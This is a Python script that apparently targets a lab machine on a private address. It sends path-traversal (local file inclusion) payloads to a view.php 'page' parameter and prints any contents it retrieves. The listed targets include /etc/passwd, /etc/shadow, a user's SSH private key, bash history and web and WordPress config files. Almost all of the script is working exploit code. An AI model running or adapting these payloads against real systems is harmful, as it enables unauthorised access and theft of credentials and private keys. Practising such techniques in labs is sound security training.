import urllib.request, socket
socket.setdefaulttimeout(10)
base = "http://192.168.18.132"

print("=== LFI - Probing Sensitive Files ===")
sensitive = [
    ("../../../etc/passwd", "/etc/passwd"),
    ("../../../etc/shadow", "/etc/shadow"),
    ("../../../home/zico/.ssh/id_rsa", "SSH private key"),
    ("../../../home/zico/.ssh/authorized_keys", "SSH authorized keys"),
    ("../../../home/zico/.bash_history", "Bash history"),
    ("../../../var/www/html/config.php", "Web config"),
    ("../../../var/www/html/wp-config.php", "WP config"),
    ("../../../proc/self/cmdline", "Process cmdline"),
    ("../../../proc/self/cwd/config.php", "Current dir config"),
]

for payload, desc in sensitive:
    try:
        url = base + "/view.php?page=" + payload
        req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read().decode("utf-8", errors="ignore")
        if len(content) > 10:
            print(f"[FOUND] {desc}:")
            print(f"  Payload: {payload}")
            print(f"  Content ({len(content)} bytes): {content[:200].replace(chr(10), ' ')[:150]}")
            print()
    except: pass

# Check tools.html for more endpoints
print("=== Checking tools.html ===")
try:
    url = base + "/view.php?page=tools.html"
    req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
    resp = urllib.request.urlopen(req, timeout=5)
    content = resp.read().decode("utf-8", errors="ignore")
    print(content[:1000])
except Exception as e:
    print(f"Error: {e}")
